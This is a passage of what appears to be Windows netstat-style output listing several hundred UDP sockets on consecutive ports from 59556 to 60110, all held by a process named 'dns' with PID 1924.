  UDP        0.0.0.0               59556         *:*                            1924              dns
  UDP        0.0.0.0               59557         *:*                            1924              dns
  UDP        0.0.0.0               59558         *:*                            1924              dns
  UDP        0.0.0.0               59559         *:*                            1924              dns
  UDP        0.0.0.0               59560         *:*                            1924              dns
  UDP        0.0.0.0               59561         *:*                            1924              dns
  UDP        0.0.0.0               59562         *:*                            1924              dns
  UDP        0.0.0.0               59563         *:*                            1924              dns
  UDP        0.0.0.0               59564         *:*                            1924              dns
  UDP        0.0.0.0               59565         *:*                            1924              dns
  UDP        0.0.0.0               59566         *:*                            1924              dns
  UDP        0.0.0.0               59567         *:*                            1924              dns
  UDP        0.0.0.0               59568         *:*                            1924              dns
  UDP        0.0.0.0               59569         *:*                            1924              dns
  UDP        0.0.0.0               59570         *:*                            1924              dns
  UDP        0.0.0.0               59571         *:*                            1924              dns
  UDP        0.0.0.0               59572         *:*                            1924              dns
  UDP        0.0.0.0               59573         *:*                            1924              dns
  UDP        0.0.0.0               59574         *:*                            1924              dns
  UDP        0.0.0.0               59575         *:*                            1924              dns
  UDP        0.0.0.0               59576         *:*                            1924              dns
  UDP        0.0.0.0               59577         *:*                            1924              dns
  UDP        0.0.0.0               59578         *:*                            1924              dns
  UDP        0.0.0.0               59579         *:*                            1924              dns
  UDP        0.0.0.0               59580         *:*                            1924              dns
  UDP        0.0.0.0               59581         *:*                            1924              dns
  UDP        0.0.0.0               59582         *:*                            1924              dns
  UDP        0.0.0.0               59583         *:*                            1924              dns
  UDP        0.0.0.0               59584         *:*                            1924              dns
  UDP        0.0.0.0               59585         *:*                            1924              dns
  UDP        0.0.0.0               59586         *:*                            1924              dns
  UDP        0.0.0.0               59587         *:*                            1924              dns
  UDP        0.0.0.0               59588         *:*                            1924              dns
  UDP        0.0.0.0               59589         *:*                            1924              dns
  UDP        0.0.0.0               59590         *:*                            1924              dns
  UDP        0.0.0.0               59591         *:*                            1924              dns
  UDP        0.0.0.0               59592         *:*                            1924              dns
  UDP        0.0.0.0               59593         *:*                            1924              dns
  UDP        0.0.0.0               59594         *:*                            1924              dns
  UDP        0.0.0.0               59595         *:*                            1924              dns
  UDP        0.0.0.0               59596         *:*                            1924              dns
  UDP        0.0.0.0               59597         *:*                            1924              dns
  UDP        0.0.0.0               59598         *:*                            1924              dns
  UDP        0.0.0.0               59599         *:*                            1924              dns
  UDP        0.0.0.0               59600         *:*                            1924              dns
  UDP        0.0.0.0               59601         *:*                            1924              dns
  UDP        0.0.0.0               59602         *:*                            1924              dns
  UDP        0.0.0.0               59603         *:*                            1924              dns
  UDP        0.0.0.0               59604         *:*                            1924              dns
  UDP        0.0.0.0               59605         *:*                            1924              dns
  UDP        0.0.0.0               59606         *:*                            1924              dns
  UDP        0.0.0.0               59607         *:*                            1924              dns
  UDP        0.0.0.0               59608         *:*                            1924              dns
  UDP        0.0.0.0               59609         *:*                            1924              dns
  UDP        0.0.0.0               59610         *:*                            1924              dns
  UDP        0.0.0.0               59611         *:*                            1924              dns
  UDP        0.0.0.0               59612         *:*                            1924              dns
  UDP        0.0.0.0               59613         *:*                            1924              dns
  UDP        0.0.0.0               59614         *:*                            1924              dns
  UDP        0.0.0.0               59615         *:*                            1924              dns
  UDP        0.0.0.0               59616         *:*                            1924              dns
  UDP        0.0.0.0               59617         *:*                            1924              dns
  UDP        0.0.0.0               59618         *:*                            1924              dns
  UDP        0.0.0.0               59619         *:*                            1924              dns
  UDP        0.0.0.0               59620         *:*                            1924              dns
  UDP        0.0.0.0               59621         *:*                            1924              dns
  UDP        0.0.0.0               59622         *:*                            1924              dns
  UDP        0.0.0.0               59623         *:*                            1924              dns
  UDP        0.0.0.0               59624         *:*                            1924              dns
  UDP        0.0.0.0               59625         *:*                            1924              dns
  UDP        0.0.0.0               59626         *:*                            1924              dns
  UDP        0.0.0.0               59627         *:*                            1924              dns
  UDP        0.0.0.0               59628         *:*                            1924              dns
  UDP        0.0.0.0               59629         *:*                            1924              dns
  UDP        0.0.0.0               59630         *:*                            1924              dns
  UDP        0.0.0.0               59631         *:*                            1924              dns
  UDP        0.0.0.0               59632         *:*                            1924              dns
  UDP        0.0.0.0               59633         *:*                            1924              dns
  UDP        0.0.0.0               59634         *:*                            1924              dns
  UDP        0.0.0.0               59635         *:*                            1924              dns
  UDP        0.0.0.0               59636         *:*                            1924              dns
  UDP        0.0.0.0               59637         *:*                            1924              dns
  UDP        0.0.0.0               59638         *:*                            1924              dns
  UDP        0.0.0.0               59639         *:*                            1924              dns
  UDP        0.0.0.0               59640         *:*                            1924              dns
  UDP        0.0.0.0               59641         *:*                            1924              dns
  UDP        0.0.0.0               59642         *:*                            1924              dns
  UDP        0.0.0.0               59643         *:*                            1924              dns
  UDP        0.0.0.0               59644         *:*                            1924              dns
  UDP        0.0.0.0               59645         *:*                            1924              dns
  UDP        0.0.0.0               59646         *:*                            1924              dns
  UDP        0.0.0.0               59647         *:*                            1924              dns
  UDP        0.0.0.0               59648         *:*                            1924              dns
  UDP        0.0.0.0               59649         *:*                            1924              dns
  UDP        0.0.0.0               59650         *:*                            1924              dns
  UDP        0.0.0.0               59651         *:*                            1924              dns
  UDP        0.0.0.0               59652         *:*                            1924              dns
  UDP        0.0.0.0               59653         *:*                            1924              dns
  UDP        0.0.0.0               59654         *:*                            1924              dns
  UDP        0.0.0.0               59655         *:*                            1924              dns
  UDP        0.0.0.0               59656         *:*                            1924              dns
  UDP        0.0.0.0               59657         *:*                            1924              dns
  UDP        0.0.0.0               59658         *:*                            1924              dns
  UDP        0.0.0.0               59659         *:*                            1924              dns
  UDP        0.0.0.0               59660         *:*                            1924              dns
  UDP        0.0.0.0               59661         *:*                            1924              dns
  UDP        0.0.0.0               59662         *:*                            1924              dns
  UDP        0.0.0.0               59663         *:*                            1924              dns
  UDP        0.0.0.0               59664         *:*                            1924              dns
  UDP        0.0.0.0               59665         *:*                            1924              dns
  UDP        0.0.0.0               59666         *:*                            1924              dns
  UDP        0.0.0.0               59667         *:*                            1924              dns
  UDP        0.0.0.0               59668         *:*                            1924              dns
  UDP        0.0.0.0               59669         *:*                            1924              dns
  UDP        0.0.0.0               59670         *:*                            1924              dns
  UDP        0.0.0.0               59671         *:*                            1924              dns
  UDP        0.0.0.0               59672         *:*                            1924              dns
  UDP        0.0.0.0               59673         *:*                            1924              dns
  UDP        0.0.0.0               59674         *:*                            1924              dns
  UDP        0.0.0.0               59675         *:*                            1924              dns
  UDP        0.0.0.0               59676         *:*                            1924              dns
  UDP        0.0.0.0               59677         *:*                            1924              dns
  UDP        0.0.0.0               59678         *:*                            1924              dns
  UDP        0.0.0.0               59679         *:*                            1924              dns
  UDP        0.0.0.0               59680         *:*                            1924              dns
  UDP        0.0.0.0               59681         *:*                            1924              dns
  UDP        0.0.0.0               59682         *:*                            1924              dns
  UDP        0.0.0.0               59683         *:*                            1924              dns
  UDP        0.0.0.0               59684         *:*                            1924              dns
  UDP        0.0.0.0               59685         *:*                            1924              dns
  UDP        0.0.0.0               59686         *:*                            1924              dns
  UDP        0.0.0.0               59687         *:*                            1924              dns
  UDP        0.0.0.0               59688         *:*                            1924              dns
  UDP        0.0.0.0               59689         *:*                            1924              dns
  UDP        0.0.0.0               59690         *:*                            1924              dns
  UDP        0.0.0.0               59691         *:*                            1924              dns
  UDP        0.0.0.0               59692         *:*                            1924              dns
  UDP        0.0.0.0               59693         *:*                            1924              dns
  UDP        0.0.0.0               59694         *:*                            1924              dns
  UDP        0.0.0.0               59695         *:*                            1924              dns
  UDP        0.0.0.0               59696         *:*                            1924              dns
  UDP        0.0.0.0               59697         *:*                            1924              dns
  UDP        0.0.0.0               59698         *:*                            1924              dns
  UDP        0.0.0.0               59699         *:*                            1924              dns
  UDP        0.0.0.0               59700         *:*                            1924              dns
  UDP        0.0.0.0               59701         *:*                            1924              dns
  UDP        0.0.0.0               59702         *:*                            1924              dns
  UDP        0.0.0.0               59703         *:*                            1924              dns
  UDP        0.0.0.0               59704         *:*                            1924              dns
  UDP        0.0.0.0               59705         *:*                            1924              dns
  UDP        0.0.0.0               59706         *:*                            1924              dns
  UDP        0.0.0.0               59707         *:*                            1924              dns
  UDP        0.0.0.0               59708         *:*                            1924              dns
  UDP        0.0.0.0               59709         *:*                            1924              dns
  UDP        0.0.0.0               59710         *:*                            1924              dns
  UDP        0.0.0.0               59711         *:*                            1924              dns
  UDP        0.0.0.0               59712         *:*                            1924              dns
  UDP        0.0.0.0               59713         *:*                            1924              dns
  UDP        0.0.0.0               59714         *:*                            1924              dns
  UDP        0.0.0.0               59715         *:*                            1924              dns
  UDP        0.0.0.0               59716         *:*                            1924              dns
  UDP        0.0.0.0               59717         *:*                            1924              dns
  UDP        0.0.0.0               59718         *:*                            1924              dns
  UDP        0.0.0.0               59719         *:*                            1924              dns
  UDP        0.0.0.0               59720         *:*                            1924              dns
  UDP        0.0.0.0               59721         *:*                            1924              dns
  UDP        0.0.0.0               59722         *:*                            1924              dns
  UDP        0.0.0.0               59723         *:*                            1924              dns
  UDP        0.0.0.0               59724         *:*                            1924              dns
  UDP        0.0.0.0               59725         *:*                            1924              dns
  UDP        0.0.0.0               59726         *:*                            1924              dns
  UDP        0.0.0.0               59727         *:*                            1924              dns
  UDP        0.0.0.0               59728         *:*                            1924              dns
  UDP        0.0.0.0               59729         *:*                            1924              dns
  UDP        0.0.0.0               59730         *:*                            1924              dns
  UDP        0.0.0.0               59731         *:*                            1924              dns
  UDP        0.0.0.0               59732         *:*                            1924              dns
  UDP        0.0.0.0               59733         *:*                            1924              dns
  UDP        0.0.0.0               59734         *:*                            1924              dns
  UDP        0.0.0.0               59735         *:*                            1924              dns
  UDP        0.0.0.0               59736         *:*                            1924              dns
  UDP        0.0.0.0               59737         *:*                            1924              dns
  UDP        0.0.0.0               59738         *:*                            1924              dns
  UDP        0.0.0.0               59739         *:*                            1924              dns
  UDP        0.0.0.0               59740         *:*                            1924              dns
  UDP        0.0.0.0               59741         *:*                            1924              dns
  UDP        0.0.0.0               59742         *:*                            1924              dns
  UDP        0.0.0.0               59743         *:*                            1924              dns
  UDP        0.0.0.0               59744         *:*                            1924              dns
  UDP        0.0.0.0               59745         *:*                            1924              dns
  UDP        0.0.0.0               59746         *:*                            1924              dns
  UDP        0.0.0.0               59747         *:*                            1924              dns
  UDP        0.0.0.0               59748         *:*                            1924              dns
  UDP        0.0.0.0               59749         *:*                            1924              dns
  UDP        0.0.0.0               59750         *:*                            1924              dns
  UDP        0.0.0.0               59751         *:*                            1924              dns
  UDP        0.0.0.0               59752         *:*                            1924              dns
  UDP        0.0.0.0               59753         *:*                            1924              dns
  UDP        0.0.0.0               59754         *:*                            1924              dns
  UDP        0.0.0.0               59755         *:*                            1924              dns
  UDP        0.0.0.0               59756         *:*                            1924              dns
  UDP        0.0.0.0               59757         *:*                            1924              dns
  UDP        0.0.0.0               59758         *:*                            1924              dns
  UDP        0.0.0.0               59759         *:*                            1924              dns
  UDP        0.0.0.0               59760         *:*                            1924              dns
  UDP        0.0.0.0               59761         *:*                            1924              dns
  UDP        0.0.0.0               59762         *:*                            1924              dns
  UDP        0.0.0.0               59763         *:*                            1924              dns
  UDP        0.0.0.0               59764         *:*                            1924              dns
  UDP        0.0.0.0               59765         *:*                            1924              dns
  UDP        0.0.0.0               59766         *:*                            1924              dns
  UDP        0.0.0.0               59767         *:*                            1924              dns
  UDP        0.0.0.0               59768         *:*                            1924              dns
  UDP        0.0.0.0               59769         *:*                            1924              dns
  UDP        0.0.0.0               59770         *:*                            1924              dns
  UDP        0.0.0.0               59771         *:*                            1924              dns
  UDP        0.0.0.0               59772         *:*                            1924              dns
  UDP        0.0.0.0               59773         *:*                            1924              dns
  UDP        0.0.0.0               59774         *:*                            1924              dns
  UDP        0.0.0.0               59775         *:*                            1924              dns
  UDP        0.0.0.0               59776         *:*                            1924              dns
  UDP        0.0.0.0               59777         *:*                            1924              dns
  UDP        0.0.0.0               59778         *:*                            1924              dns
  UDP        0.0.0.0               59779         *:*                            1924              dns
  UDP        0.0.0.0               59780         *:*                            1924              dns
  UDP        0.0.0.0               59781         *:*                            1924              dns
  UDP        0.0.0.0               59782         *:*                            1924              dns
  UDP        0.0.0.0               59783         *:*                            1924              dns
  UDP        0.0.0.0               59784         *:*                            1924              dns
  UDP        0.0.0.0               59785         *:*                            1924              dns
  UDP        0.0.0.0               59786         *:*                            1924              dns
  UDP        0.0.0.0               59787         *:*                            1924              dns
  UDP        0.0.0.0               59788         *:*                            1924              dns
  UDP        0.0.0.0               59789         *:*                            1924              dns
  UDP        0.0.0.0               59790         *:*                            1924              dns
  UDP        0.0.0.0               59791         *:*                            1924              dns
  UDP        0.0.0.0               59792         *:*                            1924              dns
  UDP        0.0.0.0               59793         *:*                            1924              dns
  UDP        0.0.0.0               59794         *:*                            1924              dns
  UDP        0.0.0.0               59795         *:*                            1924              dns
  UDP        0.0.0.0               59796         *:*                            1924              dns
  UDP        0.0.0.0               59797         *:*                            1924              dns
  UDP        0.0.0.0               59798         *:*                            1924              dns
  UDP        0.0.0.0               59799         *:*                            1924              dns
  UDP        0.0.0.0               59800         *:*                            1924              dns
  UDP        0.0.0.0               59801         *:*                            1924              dns
  UDP        0.0.0.0               59802         *:*                            1924              dns
  UDP        0.0.0.0               59803         *:*                            1924              dns
  UDP        0.0.0.0               59804         *:*                            1924              dns
  UDP        0.0.0.0               59805         *:*                            1924              dns
  UDP        0.0.0.0               59806         *:*                            1924              dns
  UDP        0.0.0.0               59807         *:*                            1924              dns
  UDP        0.0.0.0               59808         *:*                            1924              dns
  UDP        0.0.0.0               59809         *:*                            1924              dns
  UDP        0.0.0.0               59810         *:*                            1924              dns
  UDP        0.0.0.0               59811         *:*                            1924              dns
  UDP        0.0.0.0               59812         *:*                            1924              dns
  UDP        0.0.0.0               59813         *:*                            1924              dns
  UDP        0.0.0.0               59814         *:*                            1924              dns
  UDP        0.0.0.0               59815         *:*                            1924              dns
  UDP        0.0.0.0               59816         *:*                            1924              dns
  UDP        0.0.0.0               59817         *:*                            1924              dns
  UDP        0.0.0.0               59818         *:*                            1924              dns
  UDP        0.0.0.0               59819         *:*                            1924              dns
  UDP        0.0.0.0               59820         *:*                            1924              dns
  UDP        0.0.0.0               59821         *:*                            1924              dns
  UDP        0.0.0.0               59822         *:*                            1924              dns
  UDP        0.0.0.0               59823         *:*                            1924              dns
  UDP        0.0.0.0               59824         *:*                            1924              dns
  UDP        0.0.0.0               59825         *:*                            1924              dns
  UDP        0.0.0.0               59826         *:*                            1924              dns
  UDP        0.0.0.0               59827         *:*                            1924              dns
  UDP        0.0.0.0               59828         *:*                            1924              dns
  UDP        0.0.0.0               59829         *:*                            1924              dns
  UDP        0.0.0.0               59830         *:*                            1924              dns
  UDP        0.0.0.0               59831         *:*                            1924              dns
  UDP        0.0.0.0               59832         *:*                            1924              dns
  UDP        0.0.0.0               59833         *:*                            1924              dns
  UDP        0.0.0.0               59834         *:*                            1924              dns
  UDP        0.0.0.0               59835         *:*                            1924              dns
  UDP        0.0.0.0               59836         *:*                            1924              dns
  UDP        0.0.0.0               59837         *:*                            1924              dns
  UDP        0.0.0.0               59838         *:*                            1924              dns
  UDP        0.0.0.0               59839         *:*                            1924              dns
  UDP        0.0.0.0               59840         *:*                            1924              dns
  UDP        0.0.0.0               59841         *:*                            1924              dns
  UDP        0.0.0.0               59842         *:*                            1924              dns
  UDP        0.0.0.0               59843         *:*                            1924              dns
  UDP        0.0.0.0               59844         *:*                            1924              dns
  UDP        0.0.0.0               59845         *:*                            1924              dns
  UDP        0.0.0.0               59846         *:*                            1924              dns
  UDP        0.0.0.0               59847         *:*                            1924              dns
  UDP        0.0.0.0               59848         *:*                            1924              dns
  UDP        0.0.0.0               59849         *:*                            1924              dns
  UDP        0.0.0.0               59850         *:*                            1924              dns
  UDP        0.0.0.0               59851         *:*                            1924              dns
  UDP        0.0.0.0               59852         *:*                            1924              dns
  UDP        0.0.0.0               59853         *:*                            1924              dns
  UDP        0.0.0.0               59854         *:*                            1924              dns
  UDP        0.0.0.0               59855         *:*                            1924              dns
  UDP        0.0.0.0               59856         *:*                            1924              dns
  UDP        0.0.0.0               59857         *:*                            1924              dns
  UDP        0.0.0.0               59858         *:*                            1924              dns
  UDP        0.0.0.0               59859         *:*                            1924              dns
  UDP        0.0.0.0               59860         *:*                            1924              dns
  UDP        0.0.0.0               59861         *:*                            1924              dns
  UDP        0.0.0.0               59862         *:*                            1924              dns
  UDP        0.0.0.0               59863         *:*                            1924              dns
  UDP        0.0.0.0               59864         *:*                            1924              dns
  UDP        0.0.0.0               59865         *:*                            1924              dns
  UDP        0.0.0.0               59866         *:*                            1924              dns
  UDP        0.0.0.0               59867         *:*                            1924              dns
  UDP        0.0.0.0               59868         *:*                            1924              dns
  UDP        0.0.0.0               59869         *:*                            1924              dns
  UDP        0.0.0.0               59870         *:*                            1924              dns
  UDP        0.0.0.0               59871         *:*                            1924              dns
  UDP        0.0.0.0               59872         *:*                            1924              dns
  UDP        0.0.0.0               59873         *:*                            1924              dns
  UDP        0.0.0.0               59874         *:*                            1924              dns
  UDP        0.0.0.0               59875         *:*                            1924              dns
  UDP        0.0.0.0               59876         *:*                            1924              dns
  UDP        0.0.0.0               59877         *:*                            1924              dns
  UDP        0.0.0.0               59878         *:*                            1924              dns
  UDP        0.0.0.0               59879         *:*                            1924              dns
  UDP        0.0.0.0               59880         *:*                            1924              dns
  UDP        0.0.0.0               59881         *:*                            1924              dns
  UDP        0.0.0.0               59882         *:*                            1924              dns
  UDP        0.0.0.0               59883         *:*                            1924              dns
  UDP        0.0.0.0               59884         *:*                            1924              dns
  UDP        0.0.0.0               59885         *:*                            1924              dns
  UDP        0.0.0.0               59886         *:*                            1924              dns
  UDP        0.0.0.0               59887         *:*                            1924              dns
  UDP        0.0.0.0               59888         *:*                            1924              dns
  UDP        0.0.0.0               59889         *:*                            1924              dns
  UDP        0.0.0.0               59890         *:*                            1924              dns
  UDP        0.0.0.0               59891         *:*                            1924              dns
  UDP        0.0.0.0               59892         *:*                            1924              dns
  UDP        0.0.0.0               59893         *:*                            1924              dns
  UDP        0.0.0.0               59894         *:*                            1924              dns
  UDP        0.0.0.0               59895         *:*                            1924              dns
  UDP        0.0.0.0               59896         *:*                            1924              dns
  UDP        0.0.0.0               59897         *:*                            1924              dns
  UDP        0.0.0.0               59898         *:*                            1924              dns
  UDP        0.0.0.0               59899         *:*                            1924              dns
  UDP        0.0.0.0               59900         *:*                            1924              dns
  UDP        0.0.0.0               59901         *:*                            1924              dns
  UDP        0.0.0.0               59902         *:*                            1924              dns
  UDP        0.0.0.0               59903         *:*                            1924              dns
  UDP        0.0.0.0               59904         *:*                            1924              dns
  UDP        0.0.0.0               59905         *:*                            1924              dns
  UDP        0.0.0.0               59906         *:*                            1924              dns
  UDP        0.0.0.0               59907         *:*                            1924              dns
  UDP        0.0.0.0               59908         *:*                            1924              dns
  UDP        0.0.0.0               59909         *:*                            1924              dns
  UDP        0.0.0.0               59910         *:*                            1924              dns
  UDP        0.0.0.0               59911         *:*                            1924              dns
  UDP        0.0.0.0               59912         *:*                            1924              dns
  UDP        0.0.0.0               59913         *:*                            1924              dns
  UDP        0.0.0.0               59914         *:*                            1924              dns
  UDP        0.0.0.0               59915         *:*                            1924              dns
  UDP        0.0.0.0               59916         *:*                            1924              dns
  UDP        0.0.0.0               59917         *:*                            1924              dns
  UDP        0.0.0.0               59918         *:*                            1924              dns
  UDP        0.0.0.0               59919         *:*                            1924              dns
  UDP        0.0.0.0               59920         *:*                            1924              dns
  UDP        0.0.0.0               59921         *:*                            1924              dns
  UDP        0.0.0.0               59922         *:*                            1924              dns
  UDP        0.0.0.0               59923         *:*                            1924              dns
  UDP        0.0.0.0               59924         *:*                            1924              dns
  UDP        0.0.0.0               59925         *:*                            1924              dns
  UDP        0.0.0.0               59926         *:*                            1924              dns
  UDP        0.0.0.0               59927         *:*                            1924              dns
  UDP        0.0.0.0               59928         *:*                            1924              dns
  UDP        0.0.0.0               59929         *:*                            1924              dns
  UDP        0.0.0.0               59930         *:*                            1924              dns
  UDP        0.0.0.0               59931         *:*                            1924              dns
  UDP        0.0.0.0               59932         *:*                            1924              dns
  UDP        0.0.0.0               59933         *:*                            1924              dns
  UDP        0.0.0.0               59934         *:*                            1924              dns
  UDP        0.0.0.0               59935         *:*                            1924              dns
  UDP        0.0.0.0               59936         *:*                            1924              dns
  UDP        0.0.0.0               59937         *:*                            1924              dns
  UDP        0.0.0.0               59938         *:*                            1924              dns
  UDP        0.0.0.0               59939         *:*                            1924              dns
  UDP        0.0.0.0               59940         *:*                            1924              dns
  UDP        0.0.0.0               59941         *:*                            1924              dns
  UDP        0.0.0.0               59942         *:*                            1924              dns
  UDP        0.0.0.0               59943         *:*                            1924              dns
  UDP        0.0.0.0               59944         *:*                            1924              dns
  UDP        0.0.0.0               59945         *:*                            1924              dns
  UDP        0.0.0.0               59946         *:*                            1924              dns
  UDP        0.0.0.0               59947         *:*                            1924              dns
  UDP        0.0.0.0               59948         *:*                            1924              dns
  UDP        0.0.0.0               59949         *:*                            1924              dns
  UDP        0.0.0.0               59950         *:*                            1924              dns
  UDP        0.0.0.0               59951         *:*                            1924              dns
  UDP        0.0.0.0               59952         *:*                            1924              dns
  UDP        0.0.0.0               59953         *:*                            1924              dns
  UDP        0.0.0.0               59954         *:*                            1924              dns
  UDP        0.0.0.0               59955         *:*                            1924              dns
  UDP        0.0.0.0               59956         *:*                            1924              dns
  UDP        0.0.0.0               59957         *:*                            1924              dns
  UDP        0.0.0.0               59958         *:*                            1924              dns
  UDP        0.0.0.0               59959         *:*                            1924              dns
  UDP        0.0.0.0               59960         *:*                            1924              dns
  UDP        0.0.0.0               59961         *:*                            1924              dns
  UDP        0.0.0.0               59962         *:*                            1924              dns
  UDP        0.0.0.0               59963         *:*                            1924              dns
  UDP        0.0.0.0               59964         *:*                            1924              dns
  UDP        0.0.0.0               59965         *:*                            1924              dns
  UDP        0.0.0.0               59966         *:*                            1924              dns
  UDP        0.0.0.0               59967         *:*                            1924              dns
  UDP        0.0.0.0               59968         *:*                            1924              dns
  UDP        0.0.0.0               59969         *:*                            1924              dns
  UDP        0.0.0.0               59970         *:*                            1924              dns
  UDP        0.0.0.0               59971         *:*                            1924              dns
  UDP        0.0.0.0               59972         *:*                            1924              dns
  UDP        0.0.0.0               59973         *:*                            1924              dns
  UDP        0.0.0.0               59974         *:*                            1924              dns
  UDP        0.0.0.0               59975         *:*                            1924              dns
  UDP        0.0.0.0               59976         *:*                            1924              dns
  UDP        0.0.0.0               59977         *:*                            1924              dns
  UDP        0.0.0.0               59978         *:*                            1924              dns
  UDP        0.0.0.0               59979         *:*                            1924              dns
  UDP        0.0.0.0               59980         *:*                            1924              dns
  UDP        0.0.0.0               59981         *:*                            1924              dns
  UDP        0.0.0.0               59982         *:*                            1924              dns
  UDP        0.0.0.0               59983         *:*                            1924              dns
  UDP        0.0.0.0               59984         *:*                            1924              dns
  UDP        0.0.0.0               59985         *:*                            1924              dns
  UDP        0.0.0.0               59986         *:*                            1924              dns
  UDP        0.0.0.0               59987         *:*                            1924              dns
  UDP        0.0.0.0               59988         *:*                            1924              dns
  UDP        0.0.0.0               59989         *:*                            1924              dns
  UDP        0.0.0.0               59990         *:*                            1924              dns
  UDP        0.0.0.0               59991         *:*                            1924              dns
  UDP        0.0.0.0               59992         *:*                            1924              dns
  UDP        0.0.0.0               59993         *:*                            1924              dns
  UDP        0.0.0.0               59994         *:*                            1924              dns
  UDP        0.0.0.0               59995         *:*                            1924              dns
  UDP        0.0.0.0               59996         *:*                            1924              dns
  UDP        0.0.0.0               59997         *:*                            1924              dns
  UDP        0.0.0.0               59998         *:*                            1924              dns
  UDP        0.0.0.0               59999         *:*                            1924              dns
  UDP        0.0.0.0               60000         *:*                            1924              dns
  UDP        0.0.0.0               60001         *:*                            1924              dns
  UDP        0.0.0.0               60002         *:*                            1924              dns
  UDP        0.0.0.0               60003         *:*                            1924              dns
  UDP        0.0.0.0               60004         *:*                            1924              dns
  UDP        0.0.0.0               60005         *:*                            1924              dns
  UDP        0.0.0.0               60006         *:*                            1924              dns
  UDP        0.0.0.0               60007         *:*                            1924              dns
  UDP        0.0.0.0               60008         *:*                            1924              dns
  UDP        0.0.0.0               60009         *:*                            1924              dns
  UDP        0.0.0.0               60010         *:*                            1924              dns
  UDP        0.0.0.0               60011         *:*                            1924              dns
  UDP        0.0.0.0               60012         *:*                            1924              dns
  UDP        0.0.0.0               60013         *:*                            1924              dns
  UDP        0.0.0.0               60014         *:*                            1924              dns
  UDP        0.0.0.0               60015         *:*                            1924              dns
  UDP        0.0.0.0               60016         *:*                            1924              dns
  UDP        0.0.0.0               60017         *:*                            1924              dns
  UDP        0.0.0.0               60018         *:*                            1924              dns
  UDP        0.0.0.0               60019         *:*                            1924              dns
  UDP        0.0.0.0               60020         *:*                            1924              dns
  UDP        0.0.0.0               60021         *:*                            1924              dns
  UDP        0.0.0.0               60022         *:*                            1924              dns
  UDP        0.0.0.0               60023         *:*                            1924              dns
  UDP        0.0.0.0               60024         *:*                            1924              dns
  UDP        0.0.0.0               60025         *:*                            1924              dns
  UDP        0.0.0.0               60026         *:*                            1924              dns
  UDP        0.0.0.0               60027         *:*                            1924              dns
  UDP        0.0.0.0               60028         *:*                            1924              dns
  UDP        0.0.0.0               60029         *:*                            1924              dns
  UDP        0.0.0.0               60030         *:*                            1924              dns
  UDP        0.0.0.0               60031         *:*                            1924              dns
  UDP        0.0.0.0               60032         *:*                            1924              dns
  UDP        0.0.0.0               60033         *:*                            1924              dns
  UDP        0.0.0.0               60034         *:*                            1924              dns
  UDP        0.0.0.0               60035         *:*                            1924              dns
  UDP        0.0.0.0               60036         *:*                            1924              dns
  UDP        0.0.0.0               60037         *:*                            1924              dns
  UDP        0.0.0.0               60038         *:*                            1924              dns
  UDP        0.0.0.0               60039         *:*                            1924              dns
  UDP        0.0.0.0               60040         *:*                            1924              dns
  UDP        0.0.0.0               60041         *:*                            1924              dns
  UDP        0.0.0.0               60042         *:*                            1924              dns
  UDP        0.0.0.0               60043         *:*                            1924              dns
  UDP        0.0.0.0               60044         *:*                            1924              dns
  UDP        0.0.0.0               60045         *:*                            1924              dns
  UDP        0.0.0.0               60046         *:*                            1924              dns
  UDP        0.0.0.0               60047         *:*                            1924              dns
  UDP        0.0.0.0               60048         *:*                            1924              dns
  UDP        0.0.0.0               60049         *:*                            1924              dns
  UDP        0.0.0.0               60050         *:*                            1924              dns
  UDP        0.0.0.0               60051         *:*                            1924              dns
  UDP        0.0.0.0               60052         *:*                            1924              dns
  UDP        0.0.0.0               60053         *:*                            1924              dns
  UDP        0.0.0.0               60054         *:*                            1924              dns
  UDP        0.0.0.0               60055         *:*                            1924              dns
  UDP        0.0.0.0               60056         *:*                            1924              dns
  UDP        0.0.0.0               60057         *:*                            1924              dns
  UDP        0.0.0.0               60058         *:*                            1924              dns
  UDP        0.0.0.0               60059         *:*                            1924              dns
  UDP        0.0.0.0               60060         *:*                            1924              dns
  UDP        0.0.0.0               60061         *:*                            1924              dns
  UDP        0.0.0.0               60062         *:*                            1924              dns
  UDP        0.0.0.0               60063         *:*                            1924              dns
  UDP        0.0.0.0               60064         *:*                            1924              dns
  UDP        0.0.0.0               60065         *:*                            1924              dns
  UDP        0.0.0.0               60066         *:*                            1924              dns
  UDP        0.0.0.0               60067         *:*                            1924              dns
  UDP        0.0.0.0               60068         *:*                            1924              dns
  UDP        0.0.0.0               60069         *:*                            1924              dns
  UDP        0.0.0.0               60070         *:*                            1924              dns
  UDP        0.0.0.0               60071         *:*                            1924              dns
  UDP        0.0.0.0               60072         *:*                            1924              dns
  UDP        0.0.0.0               60073         *:*                            1924              dns
  UDP        0.0.0.0               60074         *:*                            1924              dns
  UDP        0.0.0.0               60075         *:*                            1924              dns
  UDP        0.0.0.0               60076         *:*                            1924              dns
  UDP        0.0.0.0               60077         *:*                            1924              dns
  UDP        0.0.0.0               60078         *:*                            1924              dns
  UDP        0.0.0.0               60079         *:*                            1924              dns
  UDP        0.0.0.0               60080         *:*                            1924              dns
  UDP        0.0.0.0               60081         *:*                            1924              dns
  UDP        0.0.0.0               60082         *:*                            1924              dns
  UDP        0.0.0.0               60083         *:*                            1924              dns
  UDP        0.0.0.0               60084         *:*                            1924              dns
  UDP        0.0.0.0               60085         *:*                            1924              dns
  UDP        0.0.0.0               60086         *:*                            1924              dns
  UDP        0.0.0.0               60087         *:*                            1924              dns
  UDP        0.0.0.0               60088         *:*                            1924              dns
  UDP        0.0.0.0               60089         *:*                            1924              dns
  UDP        0.0.0.0               60090         *:*                            1924              dns
  UDP        0.0.0.0               60091         *:*                            1924              dns
  UDP        0.0.0.0               60092         *:*                            1924              dns
  UDP        0.0.0.0               60093         *:*                            1924              dns
  UDP        0.0.0.0               60094         *:*                            1924              dns
  UDP        0.0.0.0               60095         *:*                            1924              dns
  UDP        0.0.0.0               60096         *:*                            1924              dns
  UDP        0.0.0.0               60097         *:*                            1924              dns
  UDP        0.0.0.0               60098         *:*                            1924              dns
  UDP        0.0.0.0               60099         *:*                            1924              dns
  UDP        0.0.0.0               60100         *:*                            1924              dns
  UDP        0.0.0.0               60101         *:*                            1924              dns
  UDP        0.0.0.0               60102         *:*                            1924              dns
  UDP        0.0.0.0               60103         *:*                            1924              dns
  UDP        0.0.0.0               60104         *:*                            1924              dns
  UDP        0.0.0.0               60105         *:*                            1924              dns
  UDP        0.0.0.0               60106         *:*                            1924              dns
  UDP        0.0.0.0               60107         *:*                            1924              dns
  UDP        0.0.0.0               60108         *:*                            1924              dns
  UDP        0.0.0.0               60109         *:*                            1924              dns
  UDP        0.0.0.0               60110         *:*                            1924              dns
